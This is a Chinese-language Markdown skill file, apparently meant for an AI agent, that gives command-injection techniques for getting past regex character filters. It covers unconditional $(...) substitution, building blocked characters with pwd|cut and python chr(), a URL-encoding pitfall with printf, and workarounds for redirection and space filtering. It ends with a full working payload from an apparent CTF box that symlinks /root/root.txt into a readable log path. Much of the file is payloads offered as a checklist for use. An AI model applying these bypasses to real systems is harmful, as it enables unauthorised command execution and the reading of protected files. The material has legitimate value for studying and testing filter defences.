---
name: 'command-injection-regex-bypass'
description: '命令注入正则绕过模式：$(...) 无条件执行、python chr() 生成被拦截字符、URL 编码陷阱（%→%25）'
disable-model-invocation: true
metadata: { domain: web, tier: T3 }
---


# 命令注入正则绕过技术

> 当命令注入点有字符级正则过滤时的绕过模式

## 模式 1：执行操作符选择

```text
注入前：systemctl status --no-pager {USER_INPUT}
```text

| 操作符 | 行为 | 陷阱 |
|--------|------|------|
| `\|\| cmd` | 前命令失败时才执行 | ⚠️ `systemctl status --no-pager` 无参数时 **exit 0（成功）** → `\|\|` 永不触发！ |
| `&& cmd` | 前命令成功时才执行 | `&&` 中的 `&` 通常被过滤 |
| `; cmd` | 无条件执行 | `;` 几乎总是被过滤 |
| `$(cmd)` | **命令替换** — 无条件在 subshell 中执行 | ✅ 输出为空字符串，注入后不破坏原命令语法 |

## 模式 2：阻止字符生成

**场景**：正则 `^[^;/\\&.<>\\rA-Z]*$` 阻止了 `.` `/` `>` `A-Z` `;` `&` `<` `\`

| 需要 | 生成方式 | 原理 |
|------|---------|------|
| `/` | `$(pwd\|cut -c1)` | `pwd` 输出如 `/opt/app`，`cut -c1` 取第一个字符 `/` |
| `.` | `$(python3 -c "print(chr(46))")` | ASCII 46 = `.`。**不能用 `printf '%c' 46`**（见模式 3） |
| 大写字母 | `$(tr '[a-z]' '[A-Z]' <<< cat)` → `CAT` | 先用小写写命令，再用 `tr` 转大写 |

## 模式 3：URL 编码陷阱（🔴 极易忽略）

**场景**：命令通过 HTTP POST form data 传递

```yaml
发送: data={"service": "$(printf '%c' 46)"}
      ↓ URL 编码
实际: service=%24%28printf+%27%25c%27+46%29
      ↓ 服务器解码
执行: $(printf '%c' 46)  ← 注意：%c 变成了 %25c！
      ↓ 
输出: 24 个空格 + '.'（printf 把 %25 解析为宽度 25，而非单个 '.'）
```text

**根因**：`%` 被 URL 编码为 `%25`，`printf` 收到的是 `%25c` 而非 `%c`。

**解法**：避免在 payload 中使用 `%`：
- 用 `python3 -c "print(chr(N))"` 替代 `printf '%c' N`
- 用 `awk 'BEGIN{printf "%c", N}'` 同样有 `%` 问题
- 用 `xxd -r -p <<< 2e` 生成 `.`（但 `xxd` 可能未安装）

## 模式 4：重定向绕过

`>` 被过滤时的替代方案：
- `tee /path/file` — 从 stdin 写文件
- `$(...)` 命令替换 — 无输出 = 无日志（适合 touch/ln/mv）
- `dd of=/path/file` — 指定输出文件
- `base64 -d > /path/file` 不行（`>` 被过滤）

## 模式 5：空格绕过（未用到但常用）

- `${IFS}` — IFS 环境变量默认是空格
- `$IFS` — 同上
- `%09` — TAB（HTTP 请求中未编码时）
- 但注意：form data 的 `+` 会被解码为空格

## DevArea 实战案例

```yaml
正则: ^[^;/\\&.<>\\rA-Z]*$
注入: systemctl status --no-pager {INPUT}
目标: ln -sf /root/root.txt /opt/syswatch/logs/service_log

Payload:
$(ln -sf $(pwd|cut -c1)root$(pwd|cut -c1)root$(python3 -c "print(chr(46))")txt $(pwd|cut -c1)opt$(pwd|cut -c1)syswatch$(pwd|cut -c1)logs$(pwd|cut -c1)service_log)

展开后: ln -sf /root/root.txt /opt/syswatch/logs/service_log
```text

## 检验清单

```text
[ ] 测试目标命令失败时 exit code 是什么？（决定 || 还是 && 还是 $(...)）
[ ] 逐个字符检查 payload 是否被正则拦截
[ ] 如果是 HTTP 传输，% 会被编码为 %25
[ ] 目标有 python3/perl/awk 哪个可用？
[ ] 需要生成特殊字符时，优先用 chr() 而非 printf/echo
```text
